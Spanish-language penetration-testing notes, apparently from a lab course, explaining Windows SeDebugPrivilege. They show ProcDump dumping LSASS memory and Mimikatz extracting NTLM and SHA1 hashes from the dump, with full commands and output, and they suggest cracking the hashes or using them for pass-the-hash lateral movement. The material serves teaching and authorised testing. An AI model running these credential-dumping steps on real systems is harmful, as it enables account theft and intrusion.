# SeDebugPrivilege 

El privilegio [**SeDebugPrivilege**](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs) permite a un usuario o proceso depurar otros procesos, incluyendo los del sistema. Normalmente solo los **administradores** lo tienen asignado, ya que concede la capacidad de leer memoria de procesos protegidos y modificar estructuras críticas del sistema operativo.

Puede asignarse a través de políticas locales o de dominio, bajo:

```
Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment > Debug programs
```

Este privilegio suele entregarse a **desarrolladores** o personal técnico que necesita depurar aplicaciones o servicios. Sin embargo, representa un **riesgo elevado**, ya que puede usarse para capturar información sensible de la memoria o alterar el comportamiento del sistema.

---

## Contexto en pentesting

Durante un **pentest interno**, `SeDebugPrivilege` es un objetivo interesante porque permite realizar acciones con privilegios elevados sin necesidad de pertenecer al grupo de administradores.

Por ejemplo:

* Si se obtienen múltiples **hashes NTLMv2** con herramientas como **Responder** o **Inveigh**, conviene priorizar el cracking de cuentas que podrían tener este privilegio (p. ej., cuentas de desarrolladores).
* Un usuario puede **no ser administrador local**, pero tener este derecho asignado, lo cual **no siempre es visible remotamente** (por ejemplo, mediante `BloodHound`). Por eso es útil comprobarlo manualmente al tener acceso RDP o sesión local.


<img width="1640" height="351" alt="image" src="https://github.com/user-attachments/assets/1219102e-0686-4112-b398-807edda96d78" />


---

# Volcado de LSASS con ProcDump

Tras iniciar sesión como un usuario al que se le asignó el derecho **Debug programs** y abrir una shell elevada, comprobamos que **SeDebugPrivilege** aparece listado.

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

Podemos usar [**ProcDump**](https://learn.microsoft.com/es-es/sysinternals/downloads/procdump) del paquete `Sysinternals` para aprovechar este privilegio y volcar la memoria de un proceso. Un buen candidato es el proceso **Local Security Authority Subsystem Service (LSASS)**, que almacena credenciales de usuario tras el inicio de sesión.

```cmd
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

Este procedimiento genera un volcado de memoria (`lsass.dmp`) que puede analizarse posteriormente en un entorno controlado para extraer credenciales o validar el impacto del privilegio **SeDebugPrivilege** en la seguridad del sistema.

---

Esto funciona correctamente; podemos cargar el volcado en Mimikatz usando el comando `sekurlsa::minidump`. Tras ejecutar `sekurlsa::logonpasswords` obtenemos el hash NTLM de la cuenta de administrador local que inició sesión de forma local. Podemos usarlo para realizar un ataque *pass-the-hash* y moverse lateralmente si la misma contraseña de administrador local se utiliza en uno o varios sistemas adicionales (común en organizaciones grandes).

**Nota:** siempre es buena idea teclear `log` antes de ejecutar comandos en Mimikatz; así toda la salida de comandos se guardará en un archivo `.txt`. Esto resulta especialmente útil al volcar credenciales de un servidor que puede tener muchos conjuntos de credenciales en memoria.

```
SeDebugPrivilege
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)

 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz

 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP>

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>
```

---



* El hash **NTLM** (`NTLM`) mostrado es la representación del secreto de la cuenta; puede intentarse crackear offline o utilizarse en ataques *pass-the-hash* si se reutiliza la contraseña en otros equipos.
* El comando `log` en Mimikatz crea un fichero (`mimikatz.log`) con toda la salida, muy útil como evidencia y para evitar perder información.




